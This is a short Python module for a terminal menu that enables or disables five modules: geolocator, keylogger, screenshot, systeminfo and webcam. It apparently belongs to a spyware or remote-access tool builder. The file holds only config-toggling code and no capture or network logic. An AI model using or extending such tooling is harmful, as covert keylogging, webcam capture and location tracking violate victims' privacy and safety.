from configuration import configpar as cp
from common import cprinter, cmenu
import main_menu

menu_str = """\033[92m[tools_menu]\033[0m
modules running:
~~~~~~~~~~~~~~~~~~~~~~~~~~
{}~~~~~~~~~~~~~~~~~~~~~~~~~~

[q] back to main menu

"""

def load_tools_values():
    cp.config_load()
    strings = ''
    i = 1
    for tool_key in cp.config['tools']:
        strings = strings + format_tool(tool_key, '[{}] '.format(i)) + ' \n'
        i += 1
    return strings

def format_tool(tool_key, num):
    status = cp.config_get('tools', tool_key)
    stry = r'{}: '.format(tool_key)
    if status == 'enabled':
        return num + stry + '\033[92m enabled \033[0m'
    else:
        return num + stry + '\033[91m disabled \033[0m'



def show():
    tools_menu = cmenu.Menu(menu_str.format(load_tools_values()))
    switcher = {
        '1': lambda: cp.config_switch_key('tools', 'geolocator'),
        '2': lambda: cp.config_switch_key('tools', 'keylogger'),
        '3': lambda: cp.config_switch_key('tools', 'screenshot'),
        '4': lambda: cp.config_switch_key('tools', 'systeminfo'),
        '5': lambda: cp.config_switch_key('tools', 'webcam'),
        'q': main_menu.show
    }

    tools_menu.set_switcher(switcher)

    tools_menu.clean_terminal()
    tools_menu.show_menu()
    option = tools_menu.read_input()
    while option != 'q':
        tools_menu.switch(option)
        tools_menu.clean_terminal()
        tools_menu.set_menu(menu_str.format(load_tools_values()))
        tools_menu.show_menu()
        option = tools_menu.read_input()


